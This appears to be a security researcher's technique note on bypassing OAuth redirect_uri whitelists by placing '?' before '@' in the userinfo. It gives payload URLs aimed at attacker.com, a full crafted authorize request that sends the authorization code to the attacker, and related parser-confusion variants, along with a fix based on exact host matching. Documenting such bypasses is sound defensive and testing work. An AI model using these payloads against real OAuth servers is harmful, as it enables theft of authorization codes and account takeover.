---
title: OAuth redirect_uri userinfo @ bypass via question mark
slug: oauth-userinfo-question-bypass
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/oauth, technique/url-parsing]
inbound: []
---

# OAuth redirect_uri userinfo @ bypass

## Pattern
When `redirect_uri` validation forbids `/`, `\`, `#` but allows `?` in the
userinfo section:

```
https://attacker.com?@victimhost.example.com/cb
```

The browser navigates to `attacker.com` (the `?` terminates the userinfo
section before `@`), but the OAuth server's whitelist parser treats the
part after `@` as the host. Code lands at attacker root.

## Preconditions
- Target OAuth server's URL parser splits userinfo on `@`.
- Validator forbids `/`, `\`, `#` but allows `?`.
- Attacker controls `index.php` (or equivalent) at the attacker domain to
  capture the code.

## Detection
- Submit each character from the PortSwigger URL-Validation table in the
  userinfo / pre-`@` position; diff which validator-error vs which
  browser-navigation succeeds.

## Triggering
```
GET /authorize?response_type=code
              &client_id=...
              &redirect_uri=https%3A%2F%2Fattacker.com%3F%40target.example.com%2Fcb
              &state=...
```
Browser → `https://attacker.com/?@target.example.com/cb` → attacker
captures `?code=...` from URL.

## Related variants
- Backslash userinfo: `https://test.com\:@victim.com` — backslash breaks
  parsers → navigates to test.com (Ep 44).
- Path-parameter semicolon: `/test;x=1;y=2` parser disagreement (Orange
  Tsai `..;`).
- TLD regex dot-wildcard: `.*\.co\.jp$` matches `whatevercojp`.
- Chrome `googlechrome://navigate?url=...` (Ep 66) opens any URL bypassing
  scheme filters that check http/https only.

## Bypasses
- Whitelist tightened to literal `==` host string — unbypassable.

## Seen in the wild
- {date: 2024-04-11, target: undisclosed} — Ep 66 CDN-CGI episode.
- {date: 2023-11-09, target: undisclosed} — Ep 44 URL Parsing Auth Bypass
  Magic.

## References
- Critical Thinking Podcast Eps 44, 66
- PortSwigger URL Validation Lab
- Orange Tsai DEF CON 2017/2018 URL-parsing talks
